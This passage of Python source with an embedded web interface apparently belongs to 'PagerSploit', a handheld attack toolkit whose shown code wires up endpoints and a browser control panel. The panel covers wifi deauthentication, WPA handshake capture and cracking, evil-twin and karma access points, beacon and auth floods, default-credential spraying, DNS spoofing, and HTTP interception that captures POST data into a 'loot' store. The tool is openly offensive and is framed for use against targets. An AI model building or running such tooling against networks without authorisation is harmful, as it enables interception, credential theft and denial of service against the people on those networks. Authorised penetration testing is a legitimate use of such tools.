                self.send_json({'status': 'spoof active', 'domain': domain})
            else:
                self.send_json({'error': 'domain and redirect required'}, 400)

        elif path == '/api/lan/http_intercept':
            lan_http_intercept()
            self.send_json({'status': 'intercept active'})

        # --- Control ---
        elif path == '/api/stop':
            name = body.get('module', '')
            result = stop_module(name)
            self.send_json({'status': 'stopped' if result else 'not found', 'module': name})

        elif path == '/api/stop_all':
            with STATE_LOCK:
                for ev in STATE['stop_events'].values():
                    ev.set()
                for proc in STATE['jobs'].values():
                    if hasattr(proc, 'terminate'):
                        try: proc.terminate()
                        except Exception: pass
                STATE['stop_events'].clear()
                STATE['jobs'].clear()
            set_module('idle', 'All stopped')
            self.send_json({'status': 'all stopped'})

        else:
            self.send_json({'error': 'unknown endpoint'}, 404)


# ---------------------------------------------------------------------------
# Pager Display
# ---------------------------------------------------------------------------
def rgb(r, g, b):
    return ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3)

C_BG      = rgb(4, 4, 12)
C_TITLE   = rgb(0, 255, 180)
C_GREEN   = rgb(0, 255, 80)
C_RED     = rgb(255, 40, 40)
C_YELLOW  = rgb(255, 220, 0)
C_WHITE   = rgb(220, 220, 220)
C_DIM     = rgb(70, 70, 70)
C_ORANGE  = rgb(255, 140, 0)

def pager_display_loop(p, stop_event):
    p.set_rotation(270)
    BTN_B = Pager.BTN_B

    while not stop_event.is_set():
        try:
            with STATE_LOCK:
                module  = STATE['active_module']
                status  = STATE['module_status']
                loot    = STATE['loot_count']
                ip      = STATE['server_ip']
                port    = STATE['server_port']
                last_log = STATE['log'][-1] if STATE['log'] else None

            p.fill_rect(0, 0, 480, 222, C_BG)

            # Header
            p.fill_rect(0, 0, 480, 18, rgb(0, 30, 20))
            p.draw_text(4, 2, 'PAGERSPLOIT', C_TITLE, 1)
            p.fill_rect(0, 18, 480, 1, C_TITLE)

            # Connection info box
            p.fill_rect(4, 24, 472, 36, rgb(0, 15, 10))
            p.draw_text(8, 28, 'CONNECT:', C_DIM, 1)
            p.draw_text(68, 28, f'http://{ip}:{port}', C_GREEN, 1)
            p.draw_text(8, 40, 'USB-C ethernet or management AP', C_DIM, 1)
            p.fill_rect(4, 60, 472, 1, C_DIM)

            # Active module
            mod_col = C_ORANGE if module != 'idle' else C_DIM
            p.draw_text(8, 66, 'MODULE:', C_DIM, 1)
            p.draw_text(68, 66, module.upper()[:30], mod_col, 1)
            p.draw_text(8, 80, 'STATUS:', C_DIM, 1)
            p.draw_text(68, 80, status[:34], C_WHITE, 1)

            # Loot count
            p.draw_text(8, 96, 'LOOT:', C_DIM, 1)
            p.draw_text(52, 96, str(loot), C_YELLOW, 1)

            # Last log line
            if last_log:
                level_col = {'success': C_GREEN, 'error': C_RED,
                             'warn': C_ORANGE, 'info': C_WHITE}.get(last_log['level'], C_DIM)
                p.fill_rect(4, 108, 472, 1, C_DIM)
                p.draw_text(8, 112, f"[{last_log['time']}]", C_DIM, 1)
                p.draw_text(70, 112, last_log['msg'][:40], level_col, 1)

            # Running jobs
            with STATE_LOCK:
                active_jobs = list(STATE['stop_events'].keys())
            if active_jobs:
                p.fill_rect(4, 126, 472, 1, C_DIM)
                jobs_str = ' | '.join(active_jobs[:4])
                p.draw_text(8, 130, 'ACTIVE:', C_DIM, 1)
                p.draw_text(60, 130, jobs_str[:40], C_ORANGE, 1)

            # Footer
            p.fill_rect(0, 208, 480, 1, C_DIM)
            p.draw_text(4, 210, 'Browser UI active', C_DIM, 1)
            p.draw_text(380, 210, 'B=Shutdown', C_RED, 1)

            p.flip()

            _, pressed, _ = p.poll_input()
            if pressed & BTN_B:
                stop_event.set()
                break

        except Exception as e:
            print(f'display error: {e}', flush=True)

        time.sleep(0.3)


# ---------------------------------------------------------------------------
# Web UI HTML
# ---------------------------------------------------------------------------
def get_ui_html():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PagerSploit</title>
<style>
:root {
  --bg: #04040c; --panel: #080818; --border: #00ffb4;
  --text: #dcdcdc; --dim: #555; --green: #00ff50;
  --red: #ff2828; --yellow: #ffdc00; --orange: #ff8c00;
  --blue: #00b4ff; --title: #00ffb4;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body { background: var(--bg); color: var(--text); font-family: 'Courier New', monospace; font-size: 13px; }
#app { display: flex; height: 100vh; overflow: hidden; }
#sidebar {
  width: 200px; min-width: 200px; background: var(--panel);
  border-right: 1px solid var(--border); display: flex; flex-direction: column;
  overflow-y: auto;
}
#sidebar-header {
  padding: 12px 10px; border-bottom: 1px solid var(--border);
  color: var(--title); font-size: 15px; font-weight: bold; letter-spacing: 2px;
}
#sidebar-header span { font-size: 10px; color: var(--dim); display: block; margin-top: 2px; }
.nav-group { padding: 8px 0; border-bottom: 1px solid #111; }
.nav-group-title { padding: 4px 10px; font-size: 10px; color: var(--dim); letter-spacing: 1px; }
.nav-item {
  padding: 7px 14px; cursor: pointer; color: var(--dim);
  transition: all 0.1s; border-left: 2px solid transparent;
}
.nav-item:hover { color: var(--text); background: #0a0a1a; }
.nav-item.active { color: var(--title); border-left-color: var(--title); background: #050518; }
#status-bar {
  padding: 6px 10px; border-top: 1px solid #111;
  font-size: 11px; color: var(--dim); margin-top: auto;
}
#status-bar .module { color: var(--orange); }
#main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
#topbar {
  padding: 8px 16px; background: var(--panel); border-bottom: 1px solid #111;
  display: flex; align-items: center; justify-content: space-between;
}
#topbar h2 { color: var(--title); font-size: 14px; letter-spacing: 1px; }
#topbar .meta { font-size: 11px; color: var(--dim); }
#topbar .loot { color: var(--yellow); }
#content { flex: 1; overflow-y: auto; padding: 16px; }
#log-bar {
  height: 100px; background: #020208; border-top: 1px solid #111;
  overflow-y: auto; padding: 4px 10px; font-size: 11px;
}
.panel {
  background: var(--panel); border: 1px solid #111;
  border-radius: 4px; margin-bottom: 14px;
}
.panel-title {
  padding: 8px 12px; border-bottom: 1px solid #111;
  color: var(--blue); font-size: 12px; letter-spacing: 1px;
}
.panel-body { padding: 12px; }
.form-row { margin-bottom: 10px; }
.form-row label { display: block; color: var(--dim); font-size: 11px; margin-bottom: 3px; }
input, select, textarea {
  background: #06060f; border: 1px solid #222; color: var(--text);
  padding: 6px 8px; border-radius: 3px; font-family: monospace; font-size: 12px;
  width: 100%;
}
input:focus, select:focus, textarea:focus { outline: none; border-color: var(--border); }
.btn {
  padding: 7px 16px; border: 1px solid; border-radius: 3px; cursor: pointer;
  font-family: monospace; font-size: 12px; letter-spacing: 1px; background: transparent;
}
.btn-green  { color: var(--green);  border-color: var(--green);  }
.btn-red    { color: var(--red);    border-color: var(--red);    }
.btn-yellow { color: var(--yellow); border-color: var(--yellow); }
.btn-orange { color: var(--orange); border-color: var(--orange); }
.btn-blue   { color: var(--blue);   border-color: var(--blue);   }
.btn:hover { opacity: 0.8; background: rgba(255,255,255,0.03); }
.btn-sm { padding: 3px 10px; font-size: 11px; }
table { width: 100%; border-collapse: collapse; font-size: 12px; }
th { text-align: left; padding: 5px 8px; color: var(--dim); border-bottom: 1px solid #111; font-weight: normal; }
td { padding: 5px 8px; border-bottom: 1px solid #0a0a18; }
tr:hover td { background: #0a0a18; }
.tag { display: inline-block; padding: 1px 6px; border-radius: 2px; font-size: 10px; margin: 1px; }
.tag-green  { background: #001a08; color: var(--green);  border: 1px solid #003010; }
.tag-red    { background: #1a0000; color: var(--red);    border: 1px solid #300000; }
.tag-yellow { background: #1a1400; color: var(--yellow); border: 1px solid #302800; }
.tag-blue   { background: #001020; color: var(--blue);   border: 1px solid #002040; }
.tag-orange { background: #1a0800; color: var(--orange); border: 1px solid #302000; }
.log-info    { color: var(--dim); }
.log-success { color: var(--green); }
.log-error   { color: var(--red); }
.log-warn    { color: var(--orange); }
.signal-bar { display: inline-block; width: 40px; height: 8px; background: #111; border-radius: 2px; vertical-align: middle; }
.signal-fill { height: 100%; border-radius: 2px; background: var(--green); }
.hidden { display: none; }
#stop-all-btn { float: right; }
.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
@media (max-width: 600px) { .grid-2 { grid-template-columns: 1fr; } #sidebar { display: none; } }
</style>
</head>
<body>
<div id="app">
<div id="sidebar">
  <div id="sidebar-header">
    PAGERSPLOIT
    <span>v1.0 // wickedNull</span>
  </div>
  <div class="nav-group">
    <div class="nav-group-title">DASHBOARD</div>
    <div class="nav-item active" onclick="showPage('dashboard')">&#9632; Overview</div>
  </div>
  <div class="nav-group">
    <div class="nav-group-title">WIFI ATTACKS</div>
    <div class="nav-item" onclick="showPage('wifi-scan')">&#9670; AP Scanner</div>
    <div class="nav-item" onclick="showPage('wifi-deauth')">&#9670; Deauth</div>
    <div class="nav-item" onclick="showPage('wifi-capture')">&#9670; Handshake Capture</div>
    <div class="nav-item" onclick="showPage('wifi-crack')">&#9670; WPA Crack</div>
    <div class="nav-item" onclick="showPage('wifi-evil-twin')">&#9670; Evil Twin</div>
    <div class="nav-item" onclick="showPage('wifi-karma')">&#9670; Karma Attack</div>
    <div class="nav-item" onclick="showPage('wifi-beacon')">&#9670; Beacon Flood</div>
    <div class="nav-item" onclick="showPage('wifi-probe')">&#9670; Probe Harvest</div>
    <div class="nav-item" onclick="showPage('wifi-auth-flood')">&#9670; Auth Flood</div>
    <div class="nav-item" onclick="showPage('wifi-wps')">&#9670; WPS Scan</div>
  </div>
  <div class="nav-group">
    <div class="nav-group-title">LAN ATTACKS</div>
    <div class="nav-item" onclick="showPage('lan-arp')">&#9670; ARP Scan</div>
    <div class="nav-item" onclick="showPage('lan-portscan')">&#9670; Port Scan</div>
    <div class="nav-item" onclick="showPage('lan-creds')">&#9670; Default Creds</div>
    <div class="nav-item" onclick="showPage('lan-mdns')">&#9670; mDNS Discovery</div>
    <div class="nav-item" onclick="showPage('lan-dns-spoof')">&#9670; DNS Spoof</div>
    <div class="nav-item" onclick="showPage('lan-http')">&#9670; HTTP Intercept</div>
  </div>
  <div class="nav-group">
    <div class="nav-group-title">LOOT</div>
    <div class="nav-item" onclick="showPage('loot')">&#9670; Loot Manager</div>
  </div>
  <div id="status-bar">
    Module: <span class="module" id="sb-module">idle</span><br>
    <span id="sb-status" style="color:#444">Standing by</span>
  </div>
</div>

<div id="main">
  <div id="topbar">
    <h2 id="page-title">OVERVIEW</h2>
    <div class="meta">
      <span id="tb-ip">172.16.52.1:8080</span> &nbsp;|&nbsp;
      Loot: <span class="loot" id="tb-loot">0</span>
      &nbsp;
      <button class="btn btn-red btn-sm" id="stop-all-btn" onclick="stopAll()">&#9632; STOP ALL</button>
    </div>
  </div>

  <div id="content">

    <!-- DASHBOARD -->
    <div id="page-dashboard" class="page">
      <div class="grid-2">
        <div class="panel">
          <div class="panel-title">SYSTEM STATUS</div>
          <div class="panel-body">
            <table>
              <tr><td style="color:var(--dim)">Server</td><td id="dash-ip" style="color:var(--green)">-</td></tr>
              <tr><td style="color:var(--dim)">Module</td><td id="dash-module" style="color:var(--orange)">idle</td></tr>
              <tr><td style="color:var(--dim)">Status</td><td id="dash-status">-</td></tr>
              <tr><td style="color:var(--dim)">Active Jobs</td><td id="dash-jobs" style="color:var(--yellow)">0</td></tr>
              <tr><td style="color:var(--dim)">Loot Items</td><td id="dash-loot" style="color:var(--yellow)">0</td></tr>
            </table>
          </div>
        </div>
        <div class="panel">
          <div class="panel-title">QUICK ACTIONS</div>
          <div class="panel-body">
            <button class="btn btn-blue" style="width:100%;margin-bottom:8px" onclick="showPage('wifi-scan');doWifiScan()">&#9670; Scan APs</button>
            <button class="btn btn-blue" style="width:100%;margin-bottom:8px" onclick="showPage('lan-arp');doArpScan()">&#9670; ARP Scan LAN</button>
            <button class="btn btn-blue" style="width:100%;margin-bottom:8px" onclick="showPage('lan-mdns');doMdns()">&#9670; Discover Devices</button>
            <button class="btn btn-red"  style="width:100%" onclick="stopAll()">&#9632; Stop All Modules</button>
          </div>
        </div>
      </div>
      <div class="panel">
        <div class="panel-title">LAST SCAN RESULTS <span id="dash-ap-count" style="color:var(--dim)"></span></div>
        <div class="panel-body" style="max-height:200px;overflow-y:auto">
          <table id="dash-ap-table">
            <thead><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>ENC</th><th>SIGNAL</th><th></th></tr></thead>
            <tbody id="dash-ap-body"><tr><td colspan="6" style="color:var(--dim)">No scan data — run AP Scanner</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- WIFI SCAN -->
    <div id="page-wifi-scan" class="page hidden">
      <div class="panel">
        <div class="panel-title">AP SCANNER</div>
        <div class="panel-body">
          <button class="btn btn-green" onclick="doWifiScan()" id="scan-btn">&#9670; Scan Now</button>
          <span id="scan-status" style="color:var(--dim);margin-left:12px"></span>
        </div>
      </div>
      <div class="panel">
        <div class="panel-title">RESULTS <span id="scan-count" style="color:var(--dim)"></span></div>
        <div class="panel-body" style="overflow-x:auto">
          <table>
            <thead><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>ENC</th><th>SIGNAL</th><th>ACTIONS</th></tr></thead>
            <tbody id="scan-body"><tr><td colspan="6" style="color:var(--dim)">Click Scan Now</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- DEAUTH -->
    <div id="page-wifi-deauth" class="page hidden">
      <div class="panel">
        <div class="panel-title">DEAUTH ATTACK</div>
        <div class="panel-body">
          <div class="form-row"><label>Target BSSID</label><input id="deauth-bssid" placeholder="AA:BB:CC:DD:EE:FF"></div>
          <div class="form-row"><label>Channel</label><input id="deauth-channel" value="6" style="width:80px"></div>
          <div class="form-row"><label>Client MAC (FF:FF:FF:FF:FF:FF = broadcast)</label><input id="deauth-client" value="FF:FF:FF:FF:FF:FF"></div>
          <div class="form-row"><label>Count (0 = continuous)</label><input id="deauth-count" value="0" style="width:80px"></div>
          <button class="btn btn-red" onclick="doDeauth()">&#9670; Start Deauth</button>
          <button class="btn btn-yellow" onclick="stopModule('deauth')" style="margin-left:8px">&#9632; Stop</button>
        </div>
      </div>
    </div>

    <!-- HANDSHAKE CAPTURE -->
    <div id="page-wifi-capture" class="page hidden">
      <div class="panel">
        <div class="panel-title">HANDSHAKE CAPTURE</div>
        <div class="panel-body">
          <div class="form-row"><label>Target BSSID</label><input id="cap-bssid" placeholder="AA:BB:CC:DD:EE:FF"></div>
          <div class="form-row"><label>SSID (for filename)</label><input id="cap-ssid" placeholder="TargetNetwork"></div>
          <div class="form-row"><label>Channel</label><input id="cap-channel" value="6" style="width:80px"></div>
          <button class="btn btn-green" onclick="doCapture()">&#9670; Start Capture</button>
          <button class="btn btn-orange" onclick="doDeauthCapture()" style="margin-left:8px">&#9670; Capture + Deauth</button>
          <button class="btn btn-yellow" onclick="stopModule('capture')" style="margin-left:8px">&#9632; Stop</button>
          <p id="cap-status" style="color:var(--dim);margin-top:10px"></p>
        </div>
      </div>
    </div>

    <!-- WPA CRACK -->
    <div id="page-wifi-crack" class="page hidden">
      <div class="panel">
        <div class="panel-title">WPA CRACK</div>
        <div class="panel-body">
          <div class="form-row">
            <label>Capture File</label>
            <select id="crack-capfile"></select>
          </div>
          <div class="form-row">
            <label>Wordlist</label>
            <select id="crack-wordlist"></select>
          </div>
          <button class="btn btn-red" onclick="doCrack()">&#9670; Start Crack</button>
          <button class="btn btn-yellow" onclick="stopModule('crack')" style="margin-left:8px">&#9632; Stop</button>
        </div>
      </div>
    </div>

    <!-- EVIL TWIN -->
    <div id="page-wifi-evil-twin" class="page hidden">
      <div class="panel">
        <div class="panel-title">EVIL TWIN</div>
        <div class="panel-body">
          <div class="form-row"><label>SSID to Clone</label><input id="twin-ssid" placeholder="TargetNetwork"></div>
          <div class="form-row"><label>Channel</label><input id="twin-channel" value="6" style="width:80px"></div>
          <div class="form-row">
            <label>Captive Portal (optional)</label>
            <select id="twin-portal"><option value="">-- None --</option></select>
          </div>
          <button class="btn btn-red" onclick="doEvilTwin()">&#9670; Start Evil Twin</button>
          <button class="btn btn-yellow" onclick="stopModule('evil_twin')" style="margin-left:8px">&#9632; Stop</button>
        </div>
      </div>
    </div>

    <!-- KARMA -->
    <div id="page-wifi-karma" class="page hidden">
      <div class="panel">
        <div class="panel-title">KARMA ATTACK</div>
        <div class="panel-body">
          <p style="color:var(--dim);margin-bottom:12px">Responds to all probe requests with matching SSID, luring devices to connect.</p>
          <div class="form-row"><label>Channel</label><input id="karma-channel" value="6" style="width:80px"></div>
          <button class="btn btn-red" onclick="doKarma()">&#9670; Start Karma</button>
          <button class="btn btn-yellow" onclick="stopModule('karma')" style="margin-left:8px">&#9632; Stop</button>
        </div>
      </div>
    </div>

    <!-- BEACON FLOOD -->
    <div id="page-wifi-beacon" class="page hidden">
      <div class="panel">
        <div class="panel-title">BEACON FLOOD</div>
        <div class="panel-body">
          <div class="form-row">
            <label>SSIDs (one per line)</label>
            <textarea id="beacon-ssids" rows="6" placeholder="Free WiFi&#10;Starbucks&#10;ATT WiFi&#10;xfinitywifi"></textarea>
          </div>
          <button class="btn btn-orange" onclick="doBeaconFlood()">&#9670; Start Flood</button>
          <button class="btn btn-yellow" onclick="stopModule('beacon_flood')" style="margin-left:8px">&#9632; Stop</button>
        </div>
      </div>
    </div>

    <!-- PROBE HARVEST -->
    <div id="page-wifi-probe" class="page hidden">
      <div class="panel">
        <div class="panel-title">PROBE REQUEST HARVEST</div>
        <div class="panel-body">
          <p style="color:var(--dim);margin-bottom:12px">Captures probe requests to reveal what SSIDs nearby devices are searching for.</p>
          <div class="form-row"><label>Duration (seconds)</label><input id="probe-duration" value="60" style="width:80px"></div>
          <button class="btn btn-blue" onclick="doProbeHarvest()">&#9670; Start Harvest</button>
          <button class="btn btn-yellow" onclick="stopModule('probe_harvest')" style="margin-left:8px">&#9632; Stop</button>
        </div>
      </div>
    </div>

    <!-- AUTH FLOOD -->
    <div id="page-wifi-auth-flood" class="page hidden">
      <div class="panel">
        <div class="panel-title">AUTH FLOOD (AP DoS)</div>
        <div class="panel-body">
          <div class="form-row"><label>Target BSSID</label><input id="af-bssid" placeholder="AA:BB:CC:DD:EE:FF"></div>
          <div class="form-row"><label>Channel</label><input id="af-channel" value="6" style="width:80px"></div>
          <button class="btn btn-red" onclick="doAuthFlood()">&#9670; Start Flood</button>
          <button class="btn btn-yellow" onclick="stopModule('auth_flood')" style="margin-left:8px">&#9632; Stop</button>
        </div>
      </div>
    </div>

    <!-- WPS SCAN -->
    <div id="page-wifi-wps" class="page hidden">
      <div class="panel">
        <div class="panel-title">WPS SCAN</div>
        <div class="panel-body">
          <button class="btn btn-blue" onclick="doWpsScan()">&#9670; Scan for WPS APs</button>
        </div>
      </div>
      <div class="panel">
        <div class="panel-title">WPS RESULTS</div>
        <div class="panel-body">
          <table>
            <thead><tr><th>BSSID</th><th>CH</th><th>RSSI</th><th>WPS Ver</th><th>Locked</th><th>SSID</th></tr></thead>
            <tbody id="wps-body"><tr><td colspan="6" style="color:var(--dim)">No results</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- ARP SCAN -->
    <div id="page-lan-arp" class="page hidden">
      <div class="panel">
        <div class="panel-title">ARP SCAN</div>
        <div class="panel-body">
          <div class="form-row"><label>Subnet</label><input id="arp-subnet" value="172.16.52.0/24"></div>
          <button class="btn btn-green" onclick="doArpScan()" id="arp-btn">&#9670; Scan</button>
        </div>
      </div>
      <div class="panel">
        <div class="panel-title">HOSTS <span id="arp-count" style="color:var(--dim)"></span></div>
        <div class="panel-body">
          <table>
            <thead><tr><th>IP</th><th>MAC</th><th>VENDOR</th><th>ACTIONS</th></tr></thead>
            <tbody id="arp-body"><tr><td colspan="4" style="color:var(--dim)">Run scan first</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- PORT SCAN -->
    <div id="page-lan-portscan" class="page hidden">
      <div class="panel">
        <div class="panel-title">PORT SCAN</div>
        <div class="panel-body">
          <div class="form-row"><label>Target IP</label><input id="ps-target" placeholder="172.16.52.100"></div>
          <div class="form-row"><label>Port Range</label><input id="ps-ports" value="1-1024" style="width:120px"></div>
          <button class="btn btn-blue" onclick="doPortScan()">&#9670; Scan</button>
        </div>
      </div>
      <div class="panel">
        <div class="panel-title">OPEN PORTS</div>
        <div class="panel-body">
          <pre id="ps-output" style="color:var(--green);font-size:11px;max-height:300px;overflow-y:auto">Waiting...</pre>
        </div>
      </div>
    </div>

    <!-- DEFAULT CREDS -->
    <div id="page-lan-creds" class="page hidden">
      <div class="panel">
        <div class="panel-title">DEFAULT CREDENTIAL SPRAY</div>
        <div class="panel-body">
          <div class="form-row"><label>Target IP</label><input id="cred-target" placeholder="192.168.1.1"></div>
          <button class="btn btn-orange" onclick="doDefaultCreds()">&#9670; Spray</button>
        </div>
      </div>
    </div>

    <!-- MDNS -->
    <div id="page-lan-mdns" class="page hidden">
      <div class="panel">
        <div class="panel-title">mDNS / SSDP DISCOVERY</div>
        <div class="panel-body">
          <button class="btn btn-blue" onclick="doMdns()">&#9670; Discover Devices</button>
        </div>
      </div>
    </div>

    <!-- DNS SPOOF -->
    <div id="page-lan-dns-spoof" class="page hidden">
      <div class="panel">
        <div class="panel-title">DNS SPOOF</div>
        <div class="panel-body">
          <div class="form-row"><label>Domain to Spoof</label><input id="dns-domain" placeholder="example.com"></div>
          <div class="form-row"><label>Redirect to IP</label><input id="dns-redirect" placeholder="10.0.0.1"></div>
          <button class="btn btn-red" onclick="doDnsSpoof()">&#9670; Add Spoof Entry</button>
        </div>
      </div>
    </div>

    <!-- HTTP INTERCEPT -->
    <div id="page-lan-http" class="page hidden">
      <div class="panel">
        <div class="panel-title">HTTP INTERCEPT</div>
        <div class="panel-body">
          <p style="color:var(--dim);margin-bottom:12px">Redirects port 80 traffic to an intercept server. Captures POST data and GET requests.</p>
          <button class="btn btn-red" onclick="doHttpIntercept()">&#9670; Start Intercept</button>
          <button class="btn btn-yellow" onclick="stopModule('http_intercept')" style="margin-left:8px">&#9632; Stop</button>
        </div>
      </div>
    </div>

    <!-- LOOT -->
    <div id="page-loot" class="page hidden">
      <div class="panel">
        <div class="panel-title">LOOT MANAGER</div>
        <div class="panel-body">
          <button class="btn btn-blue" onclick="loadLoot()">&#9670; Refresh</button>
        </div>
      </div>
      <div class="panel">
        <div class="panel-title">FILES</div>
        <div class="panel-body">
          <table>
            <thead><tr><th>FILE</th><th>CATEGORY</th><th>SIZE</th><th>MODIFIED</th><th></th></tr></thead>
            <tbody id="loot-body"><tr><td colspan="5" style="color:var(--dim)">No loot yet</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

  </div><!-- /content -->

  <div id="log-bar">
    <div id="log-entries"></div>
  </div>
</div><!-- /main -->
</div><!-- /app -->

<script>
const API = '';
let state = {};
let scanResults = [];

async function api(path, method='GET', body=null) {
  try {
    const opts = { method, headers: {'Content-Type':'application/json'} };
    if (body) opts.body = JSON.stringify(body);
    const r = await fetch(API + path, opts);
    return await r.json();
  } catch(e) { return {error: e.message}; }
}

function showPage(id) {
  document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
  const el = document.getElementById('page-' + id);
  if (el) el.classList.remove('hidden');
  const titles = {
    'dashboard':'OVERVIEW','wifi-scan':'AP SCANNER','wifi-deauth':'DEAUTH',
    'wifi-capture':'HANDSHAKE CAPTURE','wifi-crack':'WPA CRACK',
    'wifi-evil-twin':'EVIL TWIN','wifi-karma':'KARMA ATTACK',
    'wifi-beacon':'BEACON FLOOD','wifi-probe':'PROBE HARVEST',
    'wifi-auth-flood':'AUTH FLOOD','wifi-wps':'WPS SCAN',
    'lan-arp':'ARP SCAN','lan-portscan':'PORT SCAN','lan-creds':'DEFAULT CREDS',
    'lan-mdns':'mDNS DISCOVERY','lan-dns-spoof':'DNS SPOOF',
    'lan-http':'HTTP INTERCEPT','loot':'LOOT MANAGER'
  };
  document.getElementById('page-title').textContent = titles[id] || id.toUpperCase();
  event && event.target && event.target.classList.add('active');
  if (id === 'loot') loadLoot();
  if (id === 'wifi-crack') loadCrackSelects();
  if (id === 'wifi-evil-twin') loadPortalSelect();
}

async function pollState() {
  const s = await api('/api/state');
  if (!s.error) {
    state = s;
    document.getElementById('sb-module').textContent = s.active_module;
    document.getElementById('sb-status').textContent = s.module_status;
    document.getElementById('tb-loot').textContent = s.loot_count;
    document.getElementById('dash-module').textContent = s.active_module;
    document.getElementById('dash-status').textContent = s.module_status;
    document.getElementById('dash-loot').textContent = s.loot_count;
    document.getElementById('dash-jobs').textContent = (s.jobs||[]).length;
    document.getElementById('dash-ip').textContent = `http://${s.server_ip}:${s.server_port}`;
    document.getElementById('tb-ip').textContent = `${s.server_ip}:${s.server_port}`;
  }

  const log = await api('/api/log');
  if (!log.error) {
    const el = document.getElementById('log-entries');
    el.innerHTML = log.slice(-50).map(l =>
      `<span class="log-${l.level}">[${l.time}] ${escHtml(l.msg)}</span><br>`
    ).join('');
    el.scrollTop = el.scrollHeight;
  }

  const scans = await api('/api/scans');
  if (!scans.error && scans.length > 0) {
    scanResults = scans;
    updateScanTable(scans);
  }

  const hosts = await api('/api/hosts');
  if (!hosts.error && hosts.length > 0) updateArpTable(hosts);
}

function escHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function signalBar(dbm) {
  const pct = Math.max(0, Math.min(100, (dbm + 100) * 2));
  const col = pct > 60 ? '#00ff50' : pct > 30 ? '#ffdc00' : '#ff2828';
  return `<div class="signal-bar"><div class="signal-fill" style="width:${pct}%;background:${col}"></div></div> ${dbm}`;
}

function updateScanTable(aps) {
  const tbody = document.getElementById('scan-body');
  const dbody = document.getElementById('dash-ap-body');
  const rows = aps.map(a => `<tr>
    <td>${escHtml(a.ssid)}</td>
    <td style="font-size:11px;color:var(--dim)">${a.bssid}</td>
    <td>${a.channel}</td>
    <td><span class="tag ${a.enc==='Open'?'tag-red':'tag-green'}">${a.enc}</span></td>
    <td>${signalBar(a.signal)}</td>
    <td>
      <button class="btn btn-red btn-sm" onclick="quickDeauth('${a.bssid}','${a.channel}')">Deauth</button>
      <button class="btn btn-orange btn-sm" onclick="quickCapture('${a.bssid}','${a.channel}','${escHtml(a.ssid).replace(/'/g,'')}')">Capture</button>
      <button class="btn btn-blue btn-sm" onclick="quickTwin('${escHtml(a.ssid).replace(/'/g,'')}','${a.channel}')">Twin</button>
    </td>
  </tr>`).join('');
  tbody.innerHTML = rows;
  if (dbody) dbody.innerHTML = rows;
  document.getElementById('scan-count').textContent = `(${aps.length})`;
  const c = document.getElementById('dash-ap-count');
  if (c) c.textContent = `(${aps.length})`;
}

function updateArpTable(hosts) {
  const tbody = document.getElementById('arp-body');
  if (!tbody) return;
  tbody.innerHTML = hosts.map(h => `<tr>
    <td>${h.ip}</td>
    <td style="font-size:11px;color:var(--dim)">${h.mac}</td>
    <td style="color:var(--dim)">${h.vendor}</td>
    <td>
      <button class="btn btn-blue btn-sm" onclick="document.getElementById('ps-target').value='${h.ip}';showPage('lan-portscan')">Scan</button>
      <button class="btn btn-orange btn-sm" onclick="document.getElementById('cred-target').value='${h.ip}';showPage('lan-creds')">Spray</button>
    </td>
  </tr>`).join('');
  document.getElementById('arp-count').textContent = `(${hosts.length})`;
}

async function doWifiScan() {
  document.getElementById('scan-status').textContent = 'Scanning...';
  document.getElementById('scan-body').innerHTML = '<tr><td colspan="6" style="color:var(--dim)">Scanning...</td></tr>';
  await api('/api/wifi/scan', 'POST', {});
  setTimeout(async () => {
    const scans = await api('/api/scans');
    if (!scans.error) { scanResults = scans; updateScanTable(scans); }
    document.getElementById('scan-status').textContent = `Done (${scans.length} APs)`;
  }, 8000);
}

async function doDeauth() {
  const bssid   = document.getElementById('deauth-bssid').value;
  const channel = document.getElementById('deauth-channel').value;
  const count   = document.getElementById('deauth-count').value;
  const client  = document.getElementById('deauth-client').value;
  if (!bssid) return alert('BSSID required');
  await api('/api/wifi/deauth', 'POST', {bssid, channel, count, client});
}

function quickDeauth(bssid, channel) {
  showPage('wifi-deauth');
  document.getElementById('deauth-bssid').value = bssid;
  document.getElementById('deauth-channel').value = channel;
  doDeauth();
}

async function doCapture() {
  const bssid   = document.getElementById('cap-bssid').value;
  const ssid    = document.getElementById('cap-ssid').value;
  const channel = document.getElementById('cap-channel').value;
  if (!bssid) return alert('BSSID required');
  const r = await api('/api/wifi/capture', 'POST', {bssid, ssid, channel});
  if (r.file) document.getElementById('cap-status').textContent = 'Capturing to: ' + r.file;
}

async function doDeauthCapture() {
  await doCapture();
  const bssid   = document.getElementById('cap-bssid').value;
  const channel = document.getElementById('cap-channel').value;
  if (bssid) await api('/api/wifi/deauth', 'POST', {bssid, channel, count:'10'});
}

function quickCapture(bssid, channel, ssid) {
  showPage('wifi-capture');
  document.getElementById('cap-bssid').value = bssid;
  document.getElementById('cap-channel').value = channel;
  document.getElementById('cap-ssid').value = ssid;
}

function quickTwin(ssid, channel) {
  showPage('wifi-evil-twin');
  document.getElementById('twin-ssid').value = ssid;
  document.getElementById('twin-channel').value = channel;
}

async function loadCrackSelects() {
  const loot = await api('/api/loot');
  const caps = loot.filter(l => l.name.endsWith('.cap'));
  const sel = document.getElementById('crack-capfile');
  sel.innerHTML = caps.map(c => `<option value="${c.path}">${c.name}</option>`).join('') || '<option>No cap files</option>';

  const wls = await api('/api/wordlists');
  const wsel = document.getElementById('crack-wordlist');
  wsel.innerHTML = wls.map(w => `<option value="${w.path}">${w.name} (${(w.size/1024/1024).toFixed(1)}MB)</option>`).join('') || '<option>No wordlists</option>';
}

async function doCrack() {
  const cap_file = document.getElementById('crack-capfile').value;
  const wordlist = document.getElementById('crack-wordlist').value;
